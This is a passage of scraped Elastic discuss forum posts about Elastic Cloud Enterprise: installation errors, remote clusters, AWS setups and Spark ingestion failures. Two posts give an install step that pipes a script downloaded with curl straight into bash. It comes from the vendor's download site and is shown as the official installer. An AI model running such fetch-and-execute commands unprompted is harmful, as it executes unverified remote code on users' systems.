    "body": "Hello, We are trying to register remote clusters from within another cluster in the same ECE instance. In elastic engineer 2, this is how we are told to register remote clusters: PUT _cluster/settings { \"persistent\": { \"search.remote\" : { \"germany_cluster\" : { \"seeds\" : [\"my_server:9300\",\"64.33.90.170:9300\"] } } } } The path to our elasticsearch in ECE looks more like: https://(big long uuid).10.255.255.255.ip.es.io:9243 (this is not our IP) So, for registering this, i have tried doing the above syntax we learned in engineer 2 with these as the seeds: https://(big long uuid).10.255.255.255.ip.es.io:9243 (big long uuid).10.255.255.255.ip.es.io:9243 10.255.255.255.ip.es.io:9243 And all the above options with 9300 and 9200 How should we register remote clusters in ECE?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "436b49ee-bc52-47ef-9b43-2a9702a938ac",
    "url": "https://discuss.elastic.co/t/we-are-trialling-feedback-from-others-please/146080",
    "title": "We are trialling - feedback from others please",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Wayne_Taylor",
    "date": "August 26, 2018, 10:31pm September 9, 2018, 10:32pm",
    "body": "Hi All, We are internally trialling ECE, we've been a customer of Elastic Cloud for a while and wanted to get feedback from customers using ECE. What is going well? What isn't going so well? What size of environment do you have? All the best, Wayne",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2b7f1ae5-8409-4ada-b32e-8ad769cb9616",
    "url": "https://discuss.elastic.co/t/ece-1-1-5-released/145787",
    "title": "ECE 1.1.5 released",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "suyograo",
    "date": "August 23, 2018, 6:54pm August 23, 2018, 6:54pm September 6, 2018, 6:54pm",
    "body": "We are pleased to announce that ECE 1.1.5 has been released today. This is a bug fix release. Release notes: https://www.elastic.co/guide/en/cloud-enterprise/current/ece-release-notes-1.1.5.html",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "14be055a-f6aa-4198-b4d9-ee282a289fbd",
    "url": "https://discuss.elastic.co/t/how-to-register-remote-clusters-in-ece/144912",
    "title": "How to register remote clusters in ECE?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "jthacker",
    "date": "August 17, 2018, 1:37pm August 19, 2018, 9:11am September 2, 2018, 9:11am",
    "body": "Hello, We are trying to register remote clusters from within another cluster in the same ECE instance. In elastic engineer 2, this is how we are told to register remote clusters: PUT _cluster/settings { \"persistent\": { \"search.remote\" : { \"germany_cluster\" : { \"seeds\" : [\"my_server:9300\",\"64.33.90.170:9300\"] } } } } The path to our elasticsearch in ECE looks more like: https://(big long uuid).10.255.255.255.ip.es.io:9243 (this is not our IP) So, for registering this, i have tried doing the above syntax we learned in engineer 2 with these as the seeds: https://(big long uuid).10.255.255.255.ip.es.io:9243 (big long uuid).10.255.255.255.ip.es.io:9243 10.255.255.255.ip.es.io:9243 And all the above options with 9300 and 9200 How should we register remote clusters in ECE?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3f1644e5-6c23-4303-a9f8-5ee110ad18e0",
    "url": "https://discuss.elastic.co/t/ece-v2/143480",
    "title": "ECE v2",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "crickes",
    "date": "August 8, 2018, 10:07am August 8, 2018, 10:48am August 8, 2018, 12:52pm August 16, 2018, 10:39am August 30, 2018, 10:39am",
    "body": "Does anyone know when the version released to Elastic Cloud on August 1st is going to be available on ECE?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "d69acb82-b8ea-4391-8d8c-9bc1e9954961",
    "url": "https://discuss.elastic.co/t/installing-ece-on-the-second-and-third-servers/144642",
    "title": "Installing ECE on the Second and Third Servers",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "August 16, 2018, 7:32am August 16, 2018, 8:10am August 16, 2018, 9:45am August 16, 2018, 10:15am August 30, 2018, 10:15am",
    "body": "I have managed to install ECE on a VM running on Red Hat Linux. The setup is for a small baseline installation for a non production environment. (Director coordinator, proxy and allocator on the same VM) For the post install steps, I read that the role and availability zone can be specified when installing ECE on the 2nd and 3rd hosts. Is it possible to just install ECE without specifying the role and availability zone when installing on subsequent hosts and only start to specify the roles and availability zones from the GUI after installation? Also, in the post install steps, I came across the term \"Runner\". What does it refer to? Is it another role like proxy, allocator etc ?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "3420d471-b085-42ef-b58e-e70c11565c58",
    "url": "https://discuss.elastic.co/t/reticulating-splines-es6-3-2-w-kibana-on-ece/142989",
    "title": "Reticulating Splines - ES6.3.2 w/Kibana on ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "kcurtis",
    "date": "August 3, 2018, 10:46pm August 7, 2018, 2:27pm August 7, 2018, 3:23pm August 7, 2018, 3:54pm August 7, 2018, 4:30pm August 7, 2018, 4:54pm August 7, 2018, 5:14pm August 7, 2018, 6:33pm August 8, 2018, 6:10pm August 8, 2018, 6:17pm August 8, 2018, 6:42pm August 8, 2018, 8:16pm August 13, 2018, 2:19pm August 13, 2018, 2:36pm August 27, 2018, 2:36pm",
    "body": "I'm posting this in ECE as the ES clusters live inside ECE, but that may or may not be the issue. Currently working through a ticket but no resolutions yet. Whenever I built a new ES Cluster 6.3.2 with Kibana enabled, I get \"Reticulating Splines..\" on the screen in Kibana. This appears in \"Management\" and \"Index Patterns\". It just sits there and spins and you can never create an index pattern. Normal operations in Dev Console are fine. Anyone else seeing this?",
    "website_area": "discuss",
    "replies": 15
  },
  {
    "id": "56381aa9-4dab-4f9b-b007-08442c84cad3",
    "url": "https://discuss.elastic.co/t/uid-gid-error-on-install/142633",
    "title": "Uid/gid error on install",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Archness",
    "date": "August 1, 2018, 5:30pm August 1, 2018, 5:58pm August 1, 2018, 6:03pm August 1, 2018, 6:07pm August 1, 2018, 7:49pm August 1, 2018, 8:13pm August 1, 2018, 8:20pm August 1, 2018, 8:26pm August 15, 2018, 8:26pm",
    "body": "I'm stuck installing the ece due to the following error: elastic@ece1:~$ sudo bash elastic-cloud-enterprise.sh install The UID or GID must not be smaller than 1000. I have posted my \"id\" output below as well. elastic@ece1:~$ id uid=1000(elastic) gid=1000(elastic) groups=1000(elastic),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),999(docker) This is my second install attempt for ece. Both times I have started with a clean install and followed the instructions here: https://www.elastic.co/guide/en/cloud-enterprise/current/ece-configure-hosts.html#ece-configure-hosts-xenial Any help is appreciated. Thanks",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "7f75440f-65fe-4706-9151-808a5b1c2702",
    "url": "https://discuss.elastic.co/t/reload-usermap-files/134229",
    "title": "Reload usermap files",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "jmtrc",
    "date": "June 1, 2018, 1:15pm June 15, 2018, 1:15pm July 30, 2018, 8:12pm",
    "body": "In ECE deployment, does each cluster regularly reload updated user mapping file or there is a way to force reload it without hurting the normal usage? At this moment, it seems I have to fake touch the configuration for it to reload. Thank you. Jin.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "739d48e1-1b9a-4859-a173-43b5009b6cc5",
    "url": "https://discuss.elastic.co/t/ece-disaster-recovery-how-it-works/141659",
    "title": "ECE Disaster Recovery how it works",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "tarp",
    "date": "July 25, 2018, 8:16pm July 27, 2018, 1:31pm July 27, 2018, 1:40pm July 27, 2018, 1:52pm August 10, 2018, 1:52pm",
    "body": "Hi, I'm working on creating the infrastructure for ECE at AWS on EC2. I have 3 different Autoscale Groups (Coordinators, Allocators, Proxies). EC2 instances come and go and I think I got this case handled. In my current design the only group that has scale up/down policies is the proxy group. All ASGs have a minimum of 3 servers (1 in each AZ). What happens if someone runs my script to accidentally destroy the setup? Besides firing the individual. I don't see where anything for ECE is persisted. Should I be running a snapshot on EC2? I get that the cluster's data would be in snapshots in S3. But how do I rebuild the whole ECE environment like it was? Thanks, Tim",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "2ee920ed-ab1d-484b-a7f2-398086b3d715",
    "url": "https://discuss.elastic.co/t/deploying-ece-on-aws-ec2-and-multiple-azs/141646",
    "title": "Deploying ECE on AWS EC2 and Multiple AZs",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "tarp",
    "date": "July 25, 2018, 6:20pm July 27, 2018, 1:33pm July 27, 2018, 1:45pm August 10, 2018, 1:57pm",
    "body": "Hi, The account I'm using at AWS to deploy ECE to has 4 available AZs. ECE only requires 3 for a Fault Tolerant install. Should I configure it to only use 3 out 4 or use all 4? thanks, Tim",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "699df714-09e0-4a8b-be04-7054b35d60cb",
    "url": "https://discuss.elastic.co/t/latest-centos-ami-stuck-initializing-on-boot/141623",
    "title": "Latest centos AMI stuck initializing on boot",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "tarp",
    "date": "July 25, 2018, 4:29pm July 27, 2018, 1:34pm July 27, 2018, 1:42pm August 10, 2018, 1:42pm",
    "body": "Hi, I'm testing out building my ECE cluster at AWS, I'm using the centos AMI from July 16th, ami-6b5a6314. The EC2's are hung and I don't even get a network to login to. From the AWS system console is the following. The previous AMI, ami-26143a5c, works but with a limited number of instance types. [e[32m OK e[0m] Started Network Manager Wait Online. Starting LSB: Bring up/down networking... [e[1;31mFAILEDe[0m] Failed to start LSB: Bring up/down networking. See 'systemctl status network.service' for details. [e[32m OK e[0m] Reached target Network. Starting Postfix Mail Transport Agent... Starting /etc/rc.d/rc.local Compatibility... Starting Dynamic System Tuning Daemon... Starting Initial cloud-init job (metadata service crawler)... [e[32m OK e[0m] Started /etc/rc.d/rc.local Compatibility. [ 12.088431] cloud-init[813]: Cloud-init v. 0.7.9 running 'init' at Wed, 25 Jul 2018 16:13:45 +0000. Up 12.05 seconds. [ 12.125395] cloud-init[813]: ci-info: +++++++++++++++++++++++Net device info++++++++++++++++++++++++ [ 12.125761] cloud-init[813]: ci-info: +--------+------+-----------+-----------+-------+------------+ [ 12.126020] cloud-init[813]: ci-info: | Device | Up | Address | Mask | Scope | Hw-Address | [ 12.126289] cloud-init[813]: ci-info: +--------+------+-----------+-----------+-------+------------+ [ 12.126540] cloud-init[813]: ci-info: | lo: | True | 127.0.0.1 | 255.0.0.0 | . | . | [ 12.126794] cloud-init[813]: ci-info: | lo: | True | . | . | d | . | [ 12.127035] cloud-init[813]: ci-info: +--------+------+-----------+-----------+-------+------------+ [ 12.407118] cloud-init[813]: 2018-07-25 16:13:45,385 - url_helper.py[WARNING]: Calling 'http://169.254.169.254/2009-04-04/meta-data/instance-id' failed [0/120s]: request error [('Connection aborted.', error(101, 'Network is unreachable'))] [e[32m OK e[0m] Started Postfix Mail Transport Agent. [e[32m OK e[0m] Started Dynamic System Tuning Daemon. [ 13.407268] cloud-init[813]: 2018-07-25 16:13:46,389 - url_helper.py[WARNING]: Calling 'http://169.254.169.254/2009-04-04/meta-data/instance-id' failed [1/120s]: request error [('Connection aborted.', error(101, 'Network is unreachable'))] [ 14.410487] cloud-init[813]: 2018-07-25 16:13:47,392 - url_helper.py[WARNING]: Calling 'http://169.254.169.254/2009-04-04/meta-data/instance-id' failed [2/120s]: request error [('Connection aborted.', error(101, 'Network is unreachable'))] I can provide the full log, but I can't post it here to this discussion.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "fa8ecf1a-3fe5-4ad7-af1d-1f39b86aa299",
    "url": "https://discuss.elastic.co/t/how-to-transfer-elastic-index-created-in-local-machine-to-elastic-cloud/139571",
    "title": "How to transfer elastic index created in local machine to elastic cloud?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Lakshay_Arora",
    "date": "July 11, 2018, 1:00pm July 11, 2018, 1:53pm July 12, 2018, 7:39am July 12, 2018, 7:56am July 26, 2018, 7:56am",
    "body": "I have an index created in locally setup elasticsearch and I want to transfer that index on the elastic cloud. How can I do that?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "6f8d490c-82c0-42c0-8f3b-b4c101b21065",
    "url": "https://discuss.elastic.co/t/question-about-a-cloud-instance-size-changes/139208",
    "title": "Question about a cloud instance size changes",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "dorj1234",
    "date": "July 9, 2018, 3:44pm July 10, 2018, 1:13pm July 24, 2018, 1:13pm",
    "body": "Hello, I hope this is the right place for this question: If I order an AWS box maintained by Elastic, for a monthly cost, and then if I want to grow into a bigger setup, will Elastic move me to the larger setup without any hassle or will it require to create a new bigger box and migrate to it? And if so, who does that work? I am referring to these sizes: https://www.elastic.co/cloud/elasticsearch-service/pricing Thank you ! JD",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "50286eef-85f9-4812-990c-c41a00b2f2de",
    "url": "https://discuss.elastic.co/t/elastic-cloud-enterprise-install-steps-i-followed/138810",
    "title": "Elastic Cloud Enterprise Install - Steps I followed",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Wayne_Taylor",
    "date": "July 6, 2018, 1:42am July 7, 2018, 7:36am July 7, 2018, 11:01am July 8, 2018, 10:40am July 8, 2018, 12:47pm July 8, 2018, 1:07pm July 22, 2018, 1:07pm",
    "body": "Hi All, I tried to follow some steps as documented here: https://www.elastic.co/downloads/enterprise and noticed a few issues. So documented my steps here. Hope this helps others This was executed on an EC2 with Canonical, Ubuntu, 16.04 LTS Install Docker IO sudo apt install docker.io -y Add a user sudo adduser elastic Add user to docker group sudo usermod -aG docker elastic Create mnt point for data sudo mkdir -p /mnt/data Chown the mnt point for Elastic user: sudo chown -R elastic:elastic /mnt/data Set Max Map Count - Install will fail without it: sudo sysctl -w vm.max_map_count=262144 Run the install: bash <(curl -fsSL https://download.elastic.co/cloud/elastic-cloud-enterprise.sh) install",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "9d6884f5-c1be-4e3e-9e1b-1ae22b1001fc",
    "url": "https://discuss.elastic.co/t/not-available-when-you-only-have-two-zones-see-fault-tolerance-in-the-documentation-to-learn-more/138459",
    "title": "Not available when you only have two zones. See Fault Tolerance in the documentation to learn more.?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rkalluri",
    "date": "July 3, 2018, 10:08pm July 4, 2018, 7:22am July 4, 2018, 12:30pm July 5, 2018, 8:37am July 5, 2018, 3:10pm July 5, 2018, 3:45pm July 5, 2018, 3:52pm July 19, 2018, 4:07pm",
    "body": "I have 2 zones, and want my elastic cluster to scale across them but for some reason ECE does not let me choose the 2 zones option with a Not available when you only have two zones. See Fault Tolerance in the documentation to learn more. Also is there a way to change what zone an ece instance is allocated to after the initial creation ? Fault tolerance 1 zone — Great for testing and development 2 zones — For production use Not available when you only have two zones. See Fault Tolerance in the documentation to learn more.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "6dd6be78-57c5-4b25-b3fe-3ee32d608040",
    "url": "https://discuss.elastic.co/t/how-to-adjust-threadpools-for-elastic-search-clusters-running-on-ece/137468",
    "title": "How to adjust threadpools for elastic search clusters running on ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rkalluri",
    "date": "June 26, 2018, 3:50pm June 27, 2018, 11:47am July 4, 2018, 10:11pm July 18, 2018, 10:11pm",
    "body": "How do I configure settings like below for ece managed clusters. thread_pool.bulk.queue_size: 100 I am using spark to ingest data into Elastic via the es-spark connector and am running into issues where I am seeing rejects on write. Also how does ECE assign cpu resources to clusters. Can we provide more cores to certain elastic clusters, I did not see that option anywhre during new cluster create. T18/06/26 14:59:48 WARN TaskSetManager: Lost task 19.0 in stage 0.0 (TID 19, ip-xx-yy, executor 6): org.elasticsearch.hadoop.EsHadoopException: Could not write all entries for bulk operation [196/1000]. Error sample (first [5] error messages): rejected execution of org.elasticsearch.transport.TransportService$7@34e59383 on EsThreadPoolExecutor[name = instance-0000000003/write, queue capacity = 200, org.elasticsearch.common.util.concurrent.EsThreadPoolExecutor@10558557[Running, pool size = 2, active threads = 2, queued tasks = 200, completed tasks = 56516]] rejected execution of org.elasticsearch.transport.TransportService$7@34e59383 on EsThreadPoolExecutor[name = instance-0000000003/write, queue capacity = 200, org.elasticsearch.common.util.concurrent.EsThreadPoolExecutor@10558557[Running, pool size = 2, active threads = 2, queued tasks = 200, completed tasks = 56516]] rejected execution of org.elasticsearch.transport.TransportService$7@34e59383 on EsThreadPoolExecutor[name = instance-0000000003/write, queue capacity = 200, org.elasticsearch.common.util.concurrent.EsThreadPoolExecutor@10558557[Running, pool size = 2, active threads = 2, queued tasks = 200, completed tasks = 56516]] rejected execution of org.elasticsearch.transport.TransportService$7@34e59383 on EsThreadPoolExecutor[name = instance-0000000003/write, queue capacity = 200, org.elasticsearch.common.util.concurrent.EsThreadPoolExecutor@10558557[Running, pool size = 2, active threads = 2, queued tasks = 200, completed tasks = 56516]] rejected execution of org.elasticsearch.transport.TransportService$7@34e59383 on EsThreadPoolExecutor[name = instance-0000000003/write, queue capacity = 200, org.elasticsearch.common.util.concurrent.EsThreadPoolExecutor@10558557[Running, pool size = 2, active threads = 2, queued tasks = 200, completed tasks = 56516]] Bailing out...",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "5a267e3d-f6d7-4e82-aff6-fd0e8a8aeb85",
    "url": "https://discuss.elastic.co/t/writing-to-an-ece-run-elastic-from-elastic-spark-connector-fails/138458",
    "title": "Writing to an ece run elastic from elastic-spark connector fails",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rkalluri",
    "date": "July 4, 2018, 12:52pm July 4, 2018, 9:06am July 4, 2018, 12:33pm July 18, 2018, 12:33pm",
    "body": "I have about 600M rows or 200GB of data being written from Hive to elastic via elastic-spark connectors. Things start out fine and slow down progressively and around mid point I get the following exception on the spark client side. Caused by: org.elasticsearch.hadoop.rest.EsHadoopNoNodesLeftException: Connection error (check network and/or pr oxy settings)- all nodes failed; tried tried [[http://77eba63e96b349a88b3ce7560af43d4a.1.2.3.4.ip.es.io:9200]] My elastic cluster is a 4 node cluster with 8 GB RAM each. I have not setup load balancer in front of the proxy, but specified all the proxies via the es.nodes=http://1.2.3.4:9200, http:2.3.4.5:9200 etc Any tips on how to troubleshoot?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "e93ffa8d-7d98-4161-afaa-8907df952aa9",
    "url": "https://discuss.elastic.co/t/nodes-are-bootlooping-when-attempting-to-start-cluster/138272",
    "title": "Nodes are bootlooping when attempting to start cluster",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "BryanPerkins",
    "date": "July 2, 2018, 8:38pm July 3, 2018, 9:22am July 3, 2018, 4:16pm July 17, 2018, 4:16pm",
    "body": "This issue cropped up over the weekend. I'm running a 4 instance setup of ECE and when I try to spin up a cluster on 3 of these instances, I get the following error: Unexpected error during step: [forced-cluster-reboot]: [no.found.constructor.steps.waiting.ServerBootloopingException: Instance is bootlooping [ElasticsearchInstance(ElasticsearchCluster(b1f1c59858344ab0a38f223013a578ee),instance-0000000006)]] I'm not sure as to the reason of this as it worked just 2 days ago, but it's preventing me from doing anything at all to the cluster.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "761b128e-a552-4cfa-929e-f1c6b8890ceb",
    "url": "https://discuss.elastic.co/t/kibana-plugin-installation-on-ece/137663",
    "title": "Kibana Plugin installation on ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "pravekal",
    "date": "June 27, 2018, 4:52pm June 27, 2018, 6:25pm June 27, 2018, 6:25pm July 11, 2018, 6:26pm",
    "body": "Is there a way to install custom Kibana Plugins for ECE ?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "59a60a36-e17e-42ce-a864-c9e23a13f41a",
    "url": "https://discuss.elastic.co/t/ece-installation-fail/137072",
    "title": "ECE Installation Fail",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "pravekal",
    "date": "June 22, 2018, 6:59pm June 22, 2018, 7:01pm June 22, 2018, 11:01pm July 6, 2018, 7:27pm",
    "body": "Checking internal ip connectivity... FAILED Can't connect $RUNNER_HOST_IP [173.38.50.21:20000]: Host is unreachable Errors have caused Elastic Cloud Enterprise installation to fail Some of the prerequisites failed: [internal ip connectivity], please fix before continuing Traceback (most recent call last): File \"/elastic_cloud_apps/bootstrap-initiator/initiator.py\", line 70, in <module> prerequisite.verify_prerequisites(prerequisites, bootstrap_properties) File \"/elastic_cloud_apps/bootstrap-initiator/bootstrap_initiator/prerequisite/base.py\", line 81, in verify_prerequisites raise PrerequisiteFailed(unmet) bootstrap_initiator.prerequisite.base.PrerequisiteFailed: Some of the prerequisites failed: [internal ip connectivity], please fix before continuing",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "0a664bc7-9ba0-4753-bb80-323dd41f9188",
    "url": "https://discuss.elastic.co/t/ece-1-1-4-has-been-released/135786",
    "title": "ECE 1.1.4 has been released",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "suyograo",
    "date": "June 13, 2018, 7:49pm June 14, 2018, 11:08am June 22, 2018, 7:17pm July 6, 2018, 7:12pm",
    "body": "Hi all, we are pleased to announce that ECE 1.1.4 has been released to support Elastic Stack 6.3.0 released. In addition to supporting 6.3.0, there were several bug fixes and security fixes that is available in 1.1.4. See release notes for details.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1d55e5af-8f27-4dce-aa8e-b972e70d2378",
    "url": "https://discuss.elastic.co/t/incorrect-status-on-cluster-overview/136037",
    "title": "Incorrect status on Cluster Overview",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "iremmats",
    "date": "June 15, 2018, 6:29am June 18, 2018, 10:08am June 18, 2018, 11:13am June 18, 2018, 1:52pm June 18, 2018, 3:55pm June 18, 2018, 4:26pm June 19, 2018, 8:23am June 19, 2018, 8:38am June 19, 2018, 10:17am June 19, 2018, 11:54am July 3, 2018, 11:55am",
    "body": "Hi, Anyone else having issues with the Cloud Admin UI not showing the correct status for clusters in the cluster overview? In the detailed view everything is correct but in the overview a cluster with no pending changes can still be pending and the version might differ from the correct one too. The status might also be lost entirely. Screenshot 2018-06-15 08.27.22.png2518×212 22.8 KB Screenshot 2018-06-15 08.27.57.png2514×148 9.06 KB In this case the Serilog - PROD cluster is a 6.3.0 with no pending changes. /Mats",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "4bf6c375-305c-4b33-9e5c-7b5d8d00e38c",
    "url": "https://discuss.elastic.co/t/ece-bash-install-error-docker-io-library-de-not-found/134553",
    "title": "ECE - bash install error - docker.io/library/de - not found",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "dsigiscar",
    "date": "June 5, 2018, 8:04am June 5, 2018, 8:15am June 5, 2018, 8:20am June 5, 2018, 8:23am June 5, 2018, 8:25am June 5, 2018, 8:25am June 5, 2018, 8:26am June 5, 2018, 8:27am June 5, 2018, 8:29am June 5, 2018, 8:31am June 5, 2018, 8:32am June 5, 2018, 8:36am June 5, 2018, 8:37am June 5, 2018, 8:38am June 5, 2018, 8:41am June 5, 2018, 8:49am June 5, 2018, 8:52am June 19, 2018, 8:54am",
    "body": "Hi, Im trying to install ECE on my virtual machin by following the prerequise for CentOS7 and own registry installation mode. I make the installation on the VM from scratch, I didn't encountered error during the prerequisite configuration, and i get this Error when I execute the bash install script. [elastic@localhost log]$ bash <(curl -fsSL https://download.elastic.co/cloud/elastic-cloud-enterprise.sh) install Unable to find image 'de:latest' locally Pulling repository docker.io/library/de docker: Error: image library/de not found. See 'docker run --help'. [elastic@localhost log]$ sudo cat /var/log/messages | grep docker Jun 5 09:14:22 localhost docker: time=\"2018-06-05T09:14:22.908432445+02:00\" level=error msg=\"Handler for POST /v1.23/containers/create returned error: No such image: de:latest\" Jun 5 09:14:24 localhost docker: time=\"2018-06-05T09:14:24.247328861+02:00\" level=error msg=\"Attempting next endpoint for pull after error: unauthorized: authentication required\" Jun 5 09:14:24 localhost docker: time=\"2018-06-05T09:14:24.664265423+02:00\" level=error msg=\"Not continuing with pull after error: Error: image library/de not found\" \"Handler for POST /v1.23/containers/create returned error: No such image: de:latest\" I don't understand why docker does not find the images I pulled before executing the bash docker pull docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:1.1.3 docker pull docker.elastic.co/cloud-assets/elasticsearch:6.1.3-0 docker pull docker.elastic.co/cloud-assets/kibana:6.1.3-0 docker save -o ece.1.1.3.tar docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:1.1.3 docker save -o es.6.1.3-0.tar docker.elastic.co/cloud-assets/elasticsearch:6.1.3-0 docker save -o kibana.6.1.3-0.tar docker.elastic.co/cloud-assets/kibana:6.1.3-0 docker load < FILE_PATH/ece.1.1.3.tar docker load < FILE_PATH/es.6.1.3-0.tar docker load < FILE_PATH/kibana.6.1.3-0.tar \"Attempting next endpoint for pull after error: unauthorized: authentication required\" I don't understand what authentication is required by docker, and why he is trying to find 'docker.io/library/de:latest' Please if any one have an idea,",
    "website_area": "discuss",
    "replies": 18
  },
  {
    "id": "778d02bc-c877-424b-b8a5-64e3c30dda4e",
    "url": "https://discuss.elastic.co/t/multiple-kibana-instances-per-cluster/132531",
    "title": "Multiple Kibana instances per cluster",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "jmtrc",
    "date": "May 18, 2018, 7:17pm May 24, 2018, 8:24pm May 24, 2018, 8:44pm May 31, 2018, 5:23pm June 4, 2018, 8:20am June 18, 2018, 8:20am",
    "body": "Looks like Kibana does not have a feature to apply role based access control on visualization or dashboard items within one instance. Can ECE configure multiple Kibana instances for a given cluster? I understand that permission is applied on index but this special use case wants to have minimal information leakage between users. Thanks. Jin.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "d4687145-e0e1-4615-8177-34e606635bcd",
    "url": "https://discuss.elastic.co/t/ece-costs/134211",
    "title": "ECE costs?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "bossi6of9",
    "date": "June 1, 2018, 11:49am June 1, 2018, 6:47pm June 15, 2018, 6:47pm",
    "body": "Hi, Is there a cost associated with ECE if I do on-prem hosts?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "75a00bc2-650e-4d26-a00e-2f780557a007",
    "url": "https://discuss.elastic.co/t/ece-best-practices-for-staging-production/133379",
    "title": "ECE Best practices for Staging + Production",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "SebScoFr",
    "date": "May 26, 2018, 7:56am May 26, 2018, 8:10am May 26, 2018, 2:30pm June 9, 2018, 2:30pm",
    "body": "I'm looking for the best practices for managing my Elasticsearch clusters needs with ECE. Basically I have: 2 projects in the US (staging + production) 2 projects in the UK (staging + production) And I need to create an Elasticsearch cluster for each of these projects, so 4 in total. Below is what I've considered. Option 1 1 centralized ECE installation for managing all 4 clusters. I would then add multiple hosts, some in the US region some in the UK region. From what I understand that means every clusters will use nodes in both UK and US. Not ideal as obviously I'd like my US project to use only the US region and same for UK. Option 2 1 ECE installation for the US region. 1 ECE installation for the UK region. Each installation would have a staging and a production cluster. This way both US and UK will be using nodes in their respective regions, though staging and production will share the same nodes. Option 3 1 ECE installation for staging. 1 ECE installation for production. Each installation would have a US and a UK cluster. Same problem as option 1. Option 4 1 ECE installation for US staging. 1 ECE installation for US production. 1 ECE installation for UK staging. 1 ECE installation for UK production. Everything is properly isolated, but it defeats the purpose of having one centralized instalaltion for managing different clusters. (So does option 2 and 3 btw). Any thoughts on this? What would be the recommended approach? Is there a way when creating a cluster in ECE to make it run only on specific runners? that would solve it I guess. Many thanks.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "55641f18-d7c9-4690-a7c2-ca148f162e1e",
    "url": "https://discuss.elastic.co/t/documents-for-restarting-ece-manager-server/132682",
    "title": "Documents for restarting ECE manager server",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "jmtrc",
    "date": "May 21, 2018, 5:06pm May 26, 2018, 1:20am June 9, 2018, 1:21am",
    "body": "I looked around but couldn't find a doc or forum thread about how to restart the manager (control plane) server which runs ECE admin console and nodes for several clusters. To begin with the task, I assume I need to put the server into maintenance mode and move nodes to other servers. Can someone please point me to a doc about this procedure? Thank you. Jin.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2f5496bd-d4a7-4791-a523-f508dbf88fd7",
    "url": "https://discuss.elastic.co/t/logging-and-metrics-stuck/133191",
    "title": "Logging-and-metrics stuck",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "jmtrc",
    "date": "May 24, 2018, 4:09pm May 24, 2018, 6:00pm May 25, 2018, 7:45pm June 8, 2018, 7:45pm",
    "body": "The cluster looks healthy: { \"cluster_name\" : \"05274b09effb4f9f9d237d0f92204ce9\", \"status\" : \"green\", \"timed_out\" : false, \"number_of_nodes\" : 7, \"number_of_data_nodes\" : 7, \"active_primary_shards\" : 63, \"active_shards\" : 70, \"relocating_shards\" : 0, \"initializing_shards\" : 0, \"unassigned_shards\" : 0, \"delayed_unassigned_shards\" : 0, \"number_of_pending_tasks\" : 0, \"number_of_in_flight_fetch\" : 0, \"task_max_waiting_in_queue_millis\" : 0, \"active_shards_percent_as_number\" : 100.0 } But when I was trying to increase size from 1GB to 2GB, it seems stuck with messages like these: [2018-05-24 16:04:43,380][INFO ][no.found.cluster.plan.elasticsearch.05274b09effb4f9f9d237d0f92204ce9] Timeout waiting for cluster states to update, waiting a little before rechecking... {\"cluster_id\":\"05274b09effb4f9f9d237d0f92204ce9\"} [2018-05-24 16:04:53,497][INFO ][no.found.cluster.plan.elasticsearch.05274b09effb4f9f9d237d0f92204ce9] Setting settings: [HttpRequest(PUT,/_cluster/settings,List(),HttpEntity(application/json; 